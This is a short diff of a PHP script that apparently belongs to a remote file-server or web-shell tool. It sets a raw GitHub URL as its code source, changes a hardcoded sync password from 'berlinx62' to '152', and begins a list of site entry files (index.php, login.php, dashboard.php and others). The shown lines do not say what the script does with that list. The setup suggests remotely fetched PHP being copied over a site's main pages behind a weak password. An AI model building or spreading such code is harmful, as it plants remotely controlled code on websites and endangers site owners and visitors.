@@ -8,7 +8,7 @@ $path = realpath($path);
 if (!$path || !is_dir($path)) { $path = __DIR__; }
 
 $githubSource = "https://raw.githubusercontent.com/alaminx6275-arch/php-file-server1/refs/heads/main/php-file.php";
-$syncPassword = "berlinx62";
+$syncPassword = "152";
 
 $copyNames = [
     "index.php", "home.php", "login.php", "register.php", "dashboard.php", 
